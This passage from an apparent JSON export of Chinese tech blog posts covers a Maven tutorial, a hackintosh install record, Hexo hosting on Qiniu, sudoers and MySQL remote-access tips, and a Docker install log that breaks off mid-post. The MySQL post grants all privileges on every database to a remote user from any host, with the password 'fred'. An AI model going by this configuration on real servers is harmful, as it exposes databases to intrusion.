Maven 坐标再次出现，还多了一个 scope，表示作用域（下面会描述）。\n\n- \nbuild：表示与构建相关的配置，这里的 finalName 表示最终构建后的名称 smart-demo.war，这里的 finalName 还可以使用另一种方式来定义（下面会描述）。\n\n 如果用树形图来表达 pom.xml，那么会更加清晰： \n\n![](http://static.oschina.net/uploads/space/2014/0118/232122_X0cM_223750.png)\n\n 可见，除了项目的基本信息（Maven 坐标、打包方式等）以外，每个 pom.xml 都应该包括： \n\n1. \nLifecycle（生命周期）\n\n2. \nPlugins（插件）\n\n3. \nDependencies（依赖）\n\n Lifecycle 是项目构建的生命周期，它包括 9 个 Phase（阶段）。 \n\n 大家知道，Maven 是一个核心加上多个插件的架构，而这些插件提供了一系列非常重要的功能，这些插件会在许多阶段里发挥重要作用。 \n**阶段****插件****作用** clean\n clean  清理自动生成的文件，也就是 target 目录\n validate\n 由 Maven 核心负责  验证 Maven 描述文件是否有效\n compile\n compiler、resources  编译 Java 源码\n test\n compiler、surefire、resources  运行测试代码\n package\n war  项目打包，就是生成构件包，也就是打 war 包\n verify\n由 Maven 核心负责\n 验证构件包是否有效\n install\n install  将构件包安装到本地仓库\n site\n site  生成项目站点，就是一堆静态网页文件，包括 JavaDoc\n deploy\n deploy  将构件包部署到远程仓库\n\n 以上表格中所出现的插件名称实际上是插件的别名（或称为前缀），比如：compiler 实际上是 org.apache.maven.plugins:maven-compiler-plugin:2.3.2，这个才是 Maven 插件的完全名称。 \n\n 每个插件又包括了一些列的 **Goal（目标）**，以 compiler 插件为例，它包括以下目标： \n\n- \ncompiler:help：用于显示 compiler 插件的使用帮助。\n\n- \ncompiler:compile：用于编译 main 目录下的 Java 代码。\n\n- \ncompiler:testCompile：用于编译 test 目录下的 Java 代码。\n\n 可见，插件目标才是具体干活的人，一个插件包括了一个多个目标，一个阶段可由零个或多个插件来提供支持。 \n\n 我们可以在 pom.xml 中定义一些列的项目依赖（构件包），每个构件包都会有一个 **Scope（作用域）**，它表示该构件包在什么时候起作用，包括以下五种： \n\n1. \ncompile：默认作用域，在编译、测试、运行时有效\n\n2. \n test：对于测试时有效 \n\n3. \n runtime：对于测试、运行时有效 \n\n4. \n provided：对于编译、测试时有效，但在运行时无效 \n\n5. \n system：与 provided 类似，但依赖于系统资源 \n\n可用一张矩阵表格来表示：\n| 作用域 | 编译时有效 | 测试时有效 | 运行时有效 | 示例 |\n| ------------- |:-------------:|:-----:|:--------:|:--------:|\n| compile |**√** | **√** | **√**|\n| smart-framework.jar|\n|  test |**√**|\n| junit.jar|\n| runtime | **√**| **√** |\n| mysql-connector-java.jar|\n| provided | **√**|**√**|\n| servlet-api.jar|\n| system| **√** | **√**\n\n JDK 的 rt.jar\n\n如果您想开发一个 Smart 应用，可参考如下 pom.xml：\n\n    <project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n             xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n             xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n             http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    \n        <modelVersion>4.0.0</modelVersion>\n    \n        <properties>\n            <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n            <smart.version>1.0</smart.version>\n        </properties>\n    \n        <groupId>com.smart</groupId>\n        <artifactId>smart-demo</artifactId>\n        <version>1.0</version>\n        <packaging>war</packaging>\n    \n        <dependencies>\n            <!-- JUnit -->\n            <dependency>\n                <groupId>junit</groupId>\n                <artifactId>junit</artifactId>\n                <version>4.11</version>\n                <scope>test</scope>\n            </dependency>\n            <!-- MySQL -->\n            <dependency>\n                <groupId>mysql</groupId>\n                <artifactId>mysql-connector-java</artifactId>\n                <version>5.1.25</version>\n                <scope>runtime</scope>\n            </dependency>\n            <!-- Servlet -->\n            <dependency>\n                <groupId>javax.servlet</groupId>\n                <artifactId>javax.servlet-api</artifactId>\n                <version>3.0.1</version>\n                <scope>provided</scope>\n            </dependency>\n            <!-- JSTL -->\n            <dependency>\n                <groupId>javax.servlet</groupId>\n                <artifactId>jstl</artifactId>\n                <version>1.2</version>\n                <scope>runtime</scope>\n            </dependency>\n            <!-- Smart -->\n            <dependency>\n                <groupId>com.smart</groupId>\n                <artifactId>smart-framework</artifactId>\n                <version>${smart.version}</version>\n            </dependency>\n        </dependencies>\n    \n        <build>\n            <plugins>\n                <!-- Compile -->\n                <plugin>\n                    <groupId>org.apache.maven.plugins</groupId>\n                    <artifactId>maven-compiler-plugin</artifactId>\n                    <version>2.5.1</version>\n                    <configuration>\n                        <source>1.6</source>\n                        <target>1.6</target>\n                    </configuration>\n                </plugin>\n                <!-- Test -->\n                <plugin>\n                    <groupId>org.apache.maven.plugins</groupId>\n                    <artifactId>maven-surefire-plugin</artifactId>\n                    <version>2.15</version>\n                    <configuration>\n                        <skipTests>true</skipTests>\n                    </configuration>\n                </plugin>\n                <!-- Package -->\n                <plugin>\n                    <groupId>org.apache.maven.plugins</groupId>\n                    <artifactId>maven-war-plugin</artifactId>\n                    <version>2.4</version>\n                    <configuration>\n                        <warName>${project.artifactId}</warName>\n                    </configuration>\n                </plugin>\n                <!-- Tomcat -->\n                <plugin>\n                    <groupId>org.apache.tomcat.maven</groupId>\n                    <artifactId>tomcat7-maven-plugin</artifactId>\n                    <version>2.2</version>\n                </plugin>\n            </plugins>\n        </build></project>\n以上 pom.xml 大致解释一下：\n\n- \n我们可使用 properties 来定义一些配置属性，例如：project.build.sourceEncoding（项目构建源码编码方式），可设置为 UTF-8，可防止中文乱码。也可定义相关构件包版本号，例如：smart.version，便于日后统一升级。\n\n- \n建议使用最新版本的 JUnit，通过 Archetype 自动生成的 JUnit 太老了（3.8.1），可改为最新版（4.11）。\n\n- \n因为没必要使用 MySQL 客户端的 API，它仅仅在运行时有效，所以我们将 MySQL 构件包的作用域设置为 runtime。\n\n- \n因为我们只想在代码中使用 Servlet API，而不想将它所对应的 jar 包放入 WEB-INF 的 lib 目录下，所以我们可设置 Servlet 构件包的作用域为 provided。\n\n- \n为了保证在 JDK 1.6 运行，我们可配置 maven-compiler-plugin 插件，设置输入源码为 1.6，编译输出的字节码也为 1.6。\n\n- \n如果想跳过测试，可配置 maven-surefire-plugin 插件，将 skipTests 设置为 true。\n\n- \n如果想配置生成的 war 包为 artifactId，可修改 maven-war-plugin 插件，将 warName 修改为 ${project.artifactId}，这样就无需再配置 finalName 了。\n\n- \n 如果想通过 Maven 将应用部署到 Tomcat 中，可使用 tomcat7-maven-plugin 插件，可使用 mvn tomcat7:run-war 命令来运行 war 包。\n\n#  5. 使用 Maven 命令 \n\n 前面我们已经使用了几个 Maven 命令，例如：mvn archetype:generate，mvn tomcat7:run-war 等。其实，可使用两种不同的方式来执行 Maven 命令： \n\n 方式一：**mvn <插件>:<目标> [参数]**\n\n 方式二：**mvn <阶段>**\n\n 现在我们接触到的都是第一种方式，而第二种方式才是我们日常中使用最频繁的，例如： \n\n- \n**mvn clean**：清空输出目录（即 target 目录）\n\n- \n**mvn compile**：编译源代码\n\n- \n**mvn package**：生成构件包（一般为 jar 包或 war 包）\n\n- \n**mvn install**：将构件包安装到本地仓库\n\n- \n**mvn deploy**：将构件包部署到远程仓库\n\n执行 Maven 命令需要注意的是：必须在 Maven 项目的根目录处执行，也就是当前目录下一定存在一个名为 pom.xml 的文件。\n\n#  6. 后记 \n\nMaven 使 Java 开发更加规范化与自动化，其实 Maven 那点事远远不止这些，如果您掌握了以上这些基础知识，再去学习 Maven 的高级特性，我想一定会是一件非常轻松的事情。 \n\n 推荐大家使用 [OSC Maven](http://maven.oschina.net/)，它是国内 Maven 的镜像站点，使用它可加快构件包的下载速度，从而提升您的开发效率，可阅读《[使用 OSC Maven 仓库](http://my.oschina.net/huangyong/blog/180189)》这篇文章来学会如何使用 OSC Maven。 \n\n 感谢您阅读本文，感谢您对“[Java 那点事儿](http://my.oschina.net/huangyong/blog/161419)”与“[Smart Framework](http://my.oschina.net/huangyong/blog/158380)”的支持与鼓励！ ",
			"tags":"maven,java",
			"id":"52458589",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年08月17日 11:01:01",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"戴尔 14R-7420安装黑苹果记录\n  最近在win下使用nodejs用的力不从心，而linux下的QQ太难受，所以决定给自己的电脑装一个黑苹果，经过远景论坛的各种爬文，修改，然后仿照了前人辛勤汗水造出的成果，终于吃上了黑苹果，先贴一帖我的机器配置信息吧\n配置信息\nCPU系列 英特尔 酷睿i5 3代系列   \nCPU型号 Intel 酷睿i5 3230M\nCPU主频 2.6GHz  \n内存容量",
			"title":"戴尔 14R-7420安装黑苹果记录",
			"type":"original",
			"content":"<h1 id=\"戴尔-14r-7420安装黑苹果记录\">戴尔 14R-7420安装黑苹果记录</h1>\n\n<blockquote>\n  <p>最近在win下使用nodejs用的力不从心，而linux下的QQ太难受，所以决定给自己的电脑装一个<strong><em>黑苹果</em></strong>，经过远景论坛的各种爬文，修改，然后仿照了前人辛勤汗水造出的成果，终于吃上了黑苹果，先贴一帖我的机器配置信息吧</p>\n</blockquote>\n\n\n\n<h2 id=\"配置信息\">配置信息</h2>\n\n<ul>\n<li><strong>CPU系列</strong> 英特尔 酷睿i5 3代系列   </li>\n<li><strong>CPU型号</strong> Intel 酷睿i5 3230M</li>\n<li><strong>CPU主频</strong> 2.6GHz  </li>\n<li><strong>内存容量</strong>  6GB（2GB×1+4GB×1）</li>\n<li><strong>插槽数量</strong>  2xSO-DIMM</li>\n<li><strong>硬盘容量</strong>  750GB </li>\n<li><strong>屏幕分辨率</strong> 1600x900    </li>\n<li><strong>屏幕技术</strong>  LED背光</li>\n<li><strong>显卡类型</strong>  双显卡（性能级独立显卡＋集成显卡）</li>\n<li><strong>显卡芯片</strong>  NVIDIA GeForce GT 640M＋Intel GMA HD 4000</li>\n<li><strong>无线网卡</strong>  支持802.11b/g/n无线协议</li>\n</ul>\n\n\n\n<h4 id=\"现有功能\">现有功能：</h4>\n\n<ul>\n<li>可用hdmi外接显示器</li>\n<li>电源控制</li>\n<li>声音控制</li>\n<li>hd4000集显驱动</li>\n</ul>\n\n\n\n<h4 id=\"缺少功能\">缺少功能</h4>\n\n<ul>\n<li>亮度调节</li>\n<li>内置无线网卡</li>\n</ul>\n\n<blockquote>\n  <p>目前内置无线网卡无解，我自己京东买的外置无线网卡</p>\n</blockquote>\n\n<hr>\n\n\n\n<h2 id=\"efi和镜像下载\">EFI和镜像下载</h2>\n\n<p>EFI打包下载地址：<a href=\"https://pan.baidu.com/s/1qXNuU6K\">百度云</a> . 密码: s52x</p>\n\n<p>最新原版mac镜像（版本：EI Capitan 10.11.6）<a href=\"https://pan.baidu.com/s/1qYxmHJI\">下载地址</a>. 密码: cdsj</p>\n\n<p>相同的机型可以直接用我的配置文件。 <br>\n至于教程只有自己去远景上一个个慢慢看，最难的部分我认为是dsdt的编辑还有clover的配置，相同机型的仿照前辈的成果会更有效果</p>\n\n\n\n<h2 id=\"截图展示\">截图展示</h2>\n\n<p><img src=\"http://img.blog.csdn.net/20160817105904746\" alt=\"配置\" title=\"\"></p>",
			"markdowncontent":"# 戴尔 14R-7420安装黑苹果记录\n\n> 最近在win下使用nodejs用的力不从心，而linux下的QQ太难受，所以决定给自己的电脑装一个***黑苹果***，经过远景论坛的各种爬文，修改，然后仿照了前人辛勤汗水造出的成果，终于吃上了黑苹果，先贴一帖我的机器配置信息吧\n\n## 配置信息\n* **CPU系列**\t英特尔 酷睿i5 3代系列\t\n* **CPU型号**\tIntel 酷睿i5 3230M\n* **CPU主频**\t2.6GHz\t\n* **内存容量**\t6GB（2GB×1+4GB×1）\n* **插槽数量**\t2xSO-DIMM\n* **硬盘容量**\t750GB \n* **屏幕分辨率**\t1600x900\t\n* **屏幕技术**\tLED背光\n* **显卡类型**\t双显卡（性能级独立显卡＋集成显卡）\n* **显卡芯片**\tNVIDIA GeForce GT 640M＋Intel GMA HD 4000\n* **无线网卡**\t支持802.11b/g/n无线协议\n\n#### 现有功能：\n* 可用hdmi外接显示器\n* 电源控制\n* 声音控制\n* hd4000集显驱动\n\n#### 缺少功能\n* 亮度调节\n* 内置无线网卡\n\n> 目前内置无线网卡无解，我自己京东买的外置无线网卡\n\n*************\n\n## EFI和镜像下载\n EFI打包下载地址：[百度云](https://pan.baidu.com/s/1qXNuU6K) . 密码: s52x\n\n最新原版mac镜像（版本：EI Capitan 10.11.6）[下载地址](https://pan.baidu.com/s/1qYxmHJI). 密码: cdsj\n\n相同的机型可以直接用我的配置文件。\n至于教程只有自己去远景上一个个慢慢看，最难的部分我认为是dsdt的编辑还有clover的配置，相同机型的仿照前辈的成果会更有效果\n\n## 截图展示\n![配置](http://img.blog.csdn.net/20160817105904746)\n\n",
			"tags":"黑苹果",
			"id":"52229001",
			"categories":"mac",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年07月07日 15:24:20",
			"articleedittype":1,
			"private":0,
			"channel":"14",
			"description":"由于服务器到期了，没钱买服务器，自己的个人博客也停掉了。所以决定干脆把博客迁移到hexo下来管理。将成本降到最低\n前提：备案过的域名 七牛云充值10元(开启自定义域名cdn七牛云现在规定必须要有钱)——-start..————-本地安装hexo\n  以下步骤均基于windows平台\n安装nodejs\n到nodejs官网下载node，\n安装后cmd命令行用npm -v命令查看是否将npm包管理器安装成",
			"title":"利用7牛云搭建hexo个人博客",
			"type":"original",
			"content":"<blockquote>\n  <p>由于服务器到期了，没钱买服务器，自己的个人博客也停掉了。所以决定干脆把博客迁移到hexo下来管理。将成本降到最低</p>\n</blockquote>\n\n<p><strong>前提</strong>：<code>备案过的域名</code> <code>七牛云充值10元</code>(开启自定义域名cdn七牛云现在规定必须要有钱)</p>\n\n<p>——-<strong><em>start..</em></strong>————-</p>\n\n<hr>\n\n<h1 id=\"本地安装hexo-1\">本地安装hexo</h1>\n\n<blockquote>\n  <p>以下步骤均基于windows平台</p>\n</blockquote>\n\n\n\n<h2 id=\"安装nodejs-1\">安装nodejs</h2>\n\n<ul>\n<li>到<a href=\"https://nodejs.org/en/\">nodejs</a>官网下载node，</li>\n<li>安装后cmd命令行用<code>npm -v</code>命令查看是否将npm包管理器安装成功</li>\n<li>由于国内网络环境，请使用淘宝镜像，安装<a href=\"http://npm.taobao.org/\">cnpm</a> 安装步骤略过</li>\n</ul>\n\n\n\n<h2 id=\"安装hexo-1\">安装hexo</h2>\n\n<ul>\n<li>运行<code>cnpm install -g hexo</code></li>\n<li>安装完成后新建硬盘一个目录做blog的根目录，运行命令 <code>hexo init</code></li>\n<li>初始化完成后，如果没有自动安装依赖，请执行命令 <code>cnpm install</code>将依赖包安装上</li>\n<li>完成</li>\n</ul>\n\n\n\n<h1 id=\"七牛云\">七牛云</h1>\n\n<p>— 自行注册账号等信息添加一个<strong>对象存储</strong>资源</p>\n\n<blockquote>\n  <p>空间名称假设为<strong><em>blogdata</em></strong></p>\n</blockquote>\n\n<p><img src=\"http://img.blog.csdn.net/20160707152334104\" alt=\"这里写图片描述\" title=\"\"></p>\n\n<h2 id=\"添加一个融合cdn加速\">添加一个融合cdn加速</h2>\n\n<blockquote>\n  <p>此处域名必须备案且要保证七牛平台余额有10元或10元以上</p>\n</blockquote>\n\n<ul>\n<li>将各种信息填写好后，系统会验证，时间为一天。可能几个小时就验证好了。</li>\n<li>验证完后将你的域名的dns记录解析到七牛云上，具体步骤请自行操作，不细讲。</li>\n</ul>\n\n<h2 id=\"下载七牛云开发者工具同步盘上传本地资源到七牛云\">下载七牛云开发者工具（同步盘上传本地资源到七牛云）</h2>\n\n<p>下载 <a href=\"http://developer.qiniu.com/resource/official.html#tool\">qrsbox</a> <br>\n下载好后解压文件，解压得到一个qrsbox的目录，进入目录打开<strong>qrsbox.exe</strong>文件</p>\n\n<p><img src=\"http://img.blog.csdn.net/20160707152309088\" alt=\"这里写图片描述\" title=\"\"></p>\n\n<ul>\n<li>中间需要配置    AccessKey和SecretKey还有需要同步的本地目录 <br>\nAccessKey/SecretKey查看请到<a href=\"https://portal.qiniu.com/user/key\">个人中心</a>查看</li>\n<li>bucket请填写上面申请对象资源的名字，例如我的 <strong>blogdata</strong></li>\n<li>同步源目录填写本地磁盘hexo博客的public静态页面的目录，例如我的 <code>E:\\myblog\\public</code></li>\n<li>Key前缀不管 <br>\n确认后，软件会自动同步到七牛云上。 <br>\n这时候访问你的域名即可。</li>\n</ul>\n\n\n\n<h2 id=\"hexo生成静态页面\">hexo生成静态页面</h2>\n\n<p>使用<code>hexo generate</code>生成静态页面，此时生成的静态页面会自动上传至七牛云</p>\n\n\n\n<h2 id=\"上七牛云进行blogdata空间设置默认首页等\">上七牛云进行blogdata空间设置默认首页等</h2>\n\n<ul>\n<li>设置默认首页</li>\n</ul>\n\n<p><img src=\"http://img.blog.csdn.net/20160707152236760\" alt=\"这里写图片描述\" title=\"\"> <br>\n* 自定义404页面根据需要进行设置。 <br>\n* 客户端缓存根据自己的情况进行选择</p>\n\n<hr>\n\n<p>—————Last <br>\n访问你的域名:  <a href=\"http://blog.yoqu.org\">我的博客</a> </p>",
			"markdowncontent":"\n> 由于服务器到期了，没钱买服务器，自己的个人博客也停掉了。所以决定干脆把博客迁移到hexo下来管理。将成本降到最低\n\n**前提**：`备案过的域名` `七牛云充值10元`(开启自定义域名cdn七牛云现在规定必须要有钱)\n\n-------***start..***-------------\n*************************\n\n# 本地安装hexo\n\n> 以下步骤均基于windows平台\n\n## 安装nodejs\n* 到[nodejs](https://nodejs.org/en/)官网下载node，\n* 安装后cmd命令行用`npm -v`命令查看是否将npm包管理器安装成功\n* 由于国内网络环境，请使用淘宝镜像，安装[cnpm](http://npm.taobao.org/) 安装步骤略过\n\n## 安装hexo\n* 运行`cnpm install -g hexo`\n* 安装完成后新建硬盘一个目录做blog的根目录，运行命令 `hexo init`\n* 初始化完成后，如果没有自动安装依赖，请执行命令 `cnpm install`将依赖包安装上\n* 完成\n\n# 七牛云\n\n--- 自行注册账号等信息添加一个**对象存储**资源\n> 空间名称假设为***blogdata***\n\n![这里写图片描述](http://img.blog.csdn.net/20160707152334104)\n## 添加一个融合cdn加速\n\n> 此处域名必须备案且要保证七牛平台余额有10元或10元以上\n\n* 将各种信息填写好后，系统会验证，时间为一天。可能几个小时就验证好了。\n* 验证完后将你的域名的dns记录解析到七牛云上，具体步骤请自行操作，不细讲。\n\n## 下载七牛云开发者工具（同步盘上传本地资源到七牛云）\n下载 [qrsbox](http://developer.qiniu.com/resource/official.html#tool)\n下载好后解压文件，解压得到一个qrsbox的目录，进入目录打开**qrsbox.exe**文件\n\n![这里写图片描述](http://img.blog.csdn.net/20160707152309088)\n\n* 中间需要配置    AccessKey和SecretKey还有需要同步的本地目录\n    AccessKey/SecretKey查看请到[个人中心](https://portal.qiniu.com/user/key)查看\n* bucket请填写上面申请对象资源的名字，例如我的 **blogdata**\n* 同步源目录填写本地磁盘hexo博客的public静态页面的目录，例如我的 `E:\\myblog\\public`\n* Key前缀不管\n确认后，软件会自动同步到七牛云上。\n这时候访问你的域名即可。\n## hexo生成静态页面\n使用`hexo generate`生成静态页面，此时生成的静态页面会自动上传至七牛云\n## 上七牛云进行blogdata空间设置默认首页等\n* 设置默认首页\n\n![这里写图片描述](http://img.blog.csdn.net/20160707152236760)\n* 自定义404页面根据需要进行设置。\n* 客户端缓存根据自己的情况进行选择\n\n********************\n---------------Last\n访问你的域名:  [我的博客](http://blog.yoqu.org) \n\n",
			"tags":"windows,cdn,博客,nodejs",
			"id":"51851574",
			"categories":"",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年06月16日 10:46:19",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"普通用户使用sudo时，可能会遇到不被允许。报错信息可能是 XX is not in the sudoers file. This incident will be reported.\n解决办法\n切换到root   su\n编辑文件 vim /etc/sudoers\n在root ALL=(ALL)   ALL 下面中加入一行\nroot    ALL=(ALL)   ALL\n[你的用户名] ALL=(A",
			"title":"让普通用户具备sudo执行权限-修改linux默认启动方式",
			"type":"original",
			"content":"<blockquote>\n  <p>普通用户使用sudo时，可能会遇到不被允许。报错信息可能是 XX is not in the sudoers file. This incident will be reported.</p>\n</blockquote>\n\n\n\n<h2 id=\"解决办法\">解决办法</h2>\n\n<ul>\n<li>切换到root   <code>su</code></li>\n<li>编辑文件 <code>vim /etc/sudoers</code></li>\n<li>在<code>root ALL=(ALL)   ALL</code> 下面中加入一行</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs vhdl\">root    <span class=\"hljs-keyword\">ALL</span>=(<span class=\"hljs-keyword\">ALL</span>)   <span class=\"hljs-keyword\">ALL</span>\n[你的用户名] <span class=\"hljs-keyword\">ALL</span>=(<span class=\"hljs-keyword\">ALL</span>)   <span class=\"hljs-keyword\">ALL</span></code></pre>\n\n<p>linux下有时候我们并不需要启动图形界面，这时，编辑启动文件修改配置项即可。 <br>\n <code>sudo vim /etc/inittab</code>  <br>\n 将<code>id:5:initdefault:</code>修改为<code>id:3:initdefault:</code> 即可</p>",
			"markdowncontent":">普通用户使用sudo时，可能会遇到不被允许。报错信息可能是 XX is not in the sudoers file. This incident will be reported.\n\n## 解决办法\n* 切换到root   `su`\n* 编辑文件 `vim /etc/sudoers`\n* 在`root ALL=(ALL)   ALL` 下面中加入一行\n```\nroot\tALL=(ALL)\tALL\n[你的用户名]\tALL=(ALL)\tALL\n```\n \n linux下有时候我们并不需要启动图形界面，这时，编辑启动文件修改配置项即可。\n `sudo vim /etc/inittab` \n 将`id:5:initdefault:`修改为`id:3:initdefault:` 即可",
			"tags":"linux",
			"id":"51690223",
			"categories":"linux",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年05月24日 14:01:09",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"由于开发需要，有时我们需要能够远程访问链接数据库。默认mysql设置关闭了远程访问。我们可以通过修改设置来达到目的\n$ cd /etc/mysql\n$ sudo vim my.cnf在文件中将bind-address = 127.0.0.1注释掉（即在行首加#） \n旧版本的MySQL（从一些资料上显示是5.0及其以前的版本）上使用的是skip-networking。 \n    创建一个mysql用户",
			"title":"mysql5.6允许远程服务器访问数据库",
			"type":"original",
			"content":"<blockquote>\n  <p>由于开发需要，有时我们需要能够远程访问链接数据库。默认mysql设置关闭了远程访问。我们可以通过修改设置来达到目的</p>\n</blockquote>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">$ <span class=\"hljs-built_in\">cd</span> /etc/mysql\n$ <span class=\"hljs-built_in\">sudo</span> vim my.cnf</code></pre>\n\n<p>在文件中将bind-address = 127.0.0.1注释掉（即在行首加#） <br>\n<strong>旧版本的MySQL（从一些资料上显示是5.0及其以前的版本）上使用的是skip-networking。</strong> <br>\n    创建一个mysql用户,并设置可以远程访问</p>\n\n<pre><code>    grant usage on *.* to 'fred'@'localhost' identified by 'fred';//创建用户fred密码ferd\n    select host,user,password from mysql.user where user='fred';//查看记录  \n    grant all privileges on *.* to fred@'%'identified by 'fred';//设置可以远程访问\n</code></pre>\n\n\n\n<h3 id=\"创建一个mysql用户并设置可以远程访问\">创建一个mysql用户,并设置可以远程访问</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\"><span class=\"hljs-operator\"><span class=\"hljs-keyword\">grant</span> <span class=\"hljs-keyword\">usage</span> <span class=\"hljs-keyword\">on</span> *.* <span class=\"hljs-keyword\">to</span> <span class=\"hljs-string\">'fred'</span>@<span class=\"hljs-string\">'localhost'</span> identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">'fred'</span>;</span>//创建用户fred密码ferd\n<span class=\"hljs-operator\"><span class=\"hljs-keyword\">select</span> host,<span class=\"hljs-keyword\">user</span>,password <span class=\"hljs-keyword\">from</span> mysql.<span class=\"hljs-keyword\">user</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-keyword\">user</span>=<span class=\"hljs-string\">'fred'</span>;</span>//查看记录  \n<span class=\"hljs-operator\"><span class=\"hljs-keyword\">grant</span> <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">privileges</span> <span class=\"hljs-keyword\">on</span> *.* <span class=\"hljs-keyword\">to</span> fred@<span class=\"hljs-string\">'%'</span>identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">'fred'</span>;</span>//设置可以远程访问</code></pre>",
			"markdowncontent":">由于开发需要，有时我们需要能够远程访问链接数据库。默认mysql设置关闭了远程访问。我们可以通过修改设置来达到目的\n```\n$ cd /etc/mysql\n$ sudo vim my.cnf\n```\n在文件中将bind-address = 127.0.0.1注释掉（即在行首加#）\n**旧版本的MySQL（从一些资料上显示是5.0及其以前的版本）上使用的是skip-networking。**\n    创建一个mysql用户,并设置可以远程访问\n\n        grant usage on *.* to 'fred'@'localhost' identified by 'fred';//创建用户fred密码ferd\n        select host,user,password from mysql.user where user='fred';//查看记录  \n        grant all privileges on *.* to fred@'%'identified by 'fred';//设置可以远程访问\n\n###创建一个mysql用户,并设置可以远程访问\n```\ngrant usage on *.* to 'fred'@'localhost' identified by 'fred';//创建用户fred密码ferd\nselect host,user,password from mysql.user where user='fred';//查看记录  \ngrant all privileges on *.* to fred@'%'identified by 'fred';//设置可以远程访问\n```",
			"tags":"数据库,mysql",
			"id":"51489737",
			"categories":"linux",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年05月24日 11:41:03",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"docker的安装和使用记录1.在ubuntu下安装docker。$ sudo apt-get update\n$ sudo apt-get install -y docker.io\n$ sudo ln -sf /usr/bin/docker.io /usr/local/bin/docker\n$ sudo\tsed -i\t'$acomplete -F _docker   docker' /etc/bas",
			"title":"docker的安装和使用记录",
			"type":"original",
			"content":"<h1 id=\"docker的安装和使用记录\">docker的安装和使用记录</h1>\n\n<p>1.在ubuntu下安装docker。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">$ sudo apt<span class=\"hljs-attribute\">-get</span> update\n$ sudo apt<span class=\"hljs-attribute\">-get</span> install <span class=\"hljs-attribute\">-y</span> docker<span class=\"hljs-built_in\">.</span>io\n$ sudo ln <span class=\"hljs-attribute\">-sf</span> /usr/bin/docker<span class=\"hljs-built_in\">.</span>io /usr/<span class=\"hljs-built_in\">local</span>/bin/docker\n$ sudo\tsed <span class=\"hljs-attribute\">-i</span>\t<span class=\"hljs-string\">'$acomplete -F _docker   docker'</span> /etc/bash_completion<span class=\"hljs-built_in\">.</span>d/docker<span class=\"hljs-built_in\">.</span>io</code></pre>\n\n<blockquote>\n  <p>注：我在安装的时候，执行最后一条命令报错，没有这个文件。不管它。 <br>\n  安装完毕之后，启动docker</p>\n</blockquote>\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">$ <span class=\"hljs-built_in\">sudo</span> service docker start</code></pre>\n\n<blockquote>\n  <p>我使用的是mint发行版，基于ubuntu，但是我安装完有一个bug，查询网上资料找到解决办法</p>\n</blockquote>\n\n<p><strong><em>错误信息：</em></strong></p>\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\">FATA[0000] Post http:///var/run/docker.sock/v1.18/images/<span class=\"hljs-operator\"><span class=\"hljs-keyword\">create</span>?fromImage=wpscanteam%<span class=\"hljs-number\">2</span>Fvulnerablewordpress%<span class=\"hljs-number\">3</span>Alatest: dial unix /var/run/docker.sock: <span class=\"hljs-keyword\">no</span> such file <span class=\"hljs-keyword\">or</span> directory. <span class=\"hljs-keyword\">Are</span> you trying <span class=\"hljs-keyword\">to</span> <span class=\"hljs-keyword\">connect</span> <span class=\"hljs-keyword\">to</span> a TLS-enabled daemon without TLS?</span></code></pre>\n\n<p>解决办法：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">$ <span class=\"hljs-built_in\">sudo</span> touch /var/run/docker.sock\n$ <span class=\"hljs-built_in\">sudo</span> docker <span class=\"hljs-operator\">-d</span></code></pre>\n\n<p>然后又遇到了一个问题： <br>\n<code>INFO[0000] +job serveapi(unix:///var/run/docker.sock) <br>\nINFO[0000] Listening for HTTP on unix (/var/run/docker.sock)  <br>\nINFO[0000] +job init_networkdriver() <br>\nINFO[0000] -job init_networkdriver() = OK (0) <br>\nWARN[0000] Your kernel does not support cgroup swap limit.  <br>\nFATA[0000] Shutting down daemon due to errors: Error loading docker apparmor profile: fork/exec /sbin/apparmor_parser: no such file or directory ()</code> <br>\n解决办法：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">$ <span class=\"hljs-built_in\">sudo</span> apt-get install apparmor</code></pre>",
			"markdowncontent":"#docker的安装和使用记录\n1.在ubuntu下安装docker。\n```\n$ sudo\tapt-get\tupdate\n$ sudo\tapt-get\tinstall\t-y docker.io\n$ sudo\tln -sf /usr/bin/docker.io /usr/local/bin/docker\n$ sudo\tsed -i\t'$acomplete -F _docker\tdocker'\t/etc/bash_completion.d/docker.io\n```\n>注：我在安装的时候，执行最后一条命令报错，没有这个文件。不管它。\n安装完毕之后，启动docker\n```\n$ sudo service docker start\n```\n>我使用的是mint发行版，基于ubuntu，但是我安装完有一个bug，查询网上资料找到解决办法\n\n***错误信息：***\n```\nFATA[0000] Post http:///var/run/docker.sock/v1.18/images/create?fromImage=wpscanteam%2Fvulnerablewordpress%3Alatest: dial unix /var/run/docker.sock: no such file or directory. Are you trying to connect to a TLS-enabled daemon without TLS?\n```\n解决办法：\n```\n$ sudo touch /var/run/docker.sock\n$ sudo docker -d\n```\n然后又遇到了一个问题：\n`INFO[0000] +job serveapi(unix:///var/run/docker.sock)   \nINFO[0000] Listening for HTTP on unix 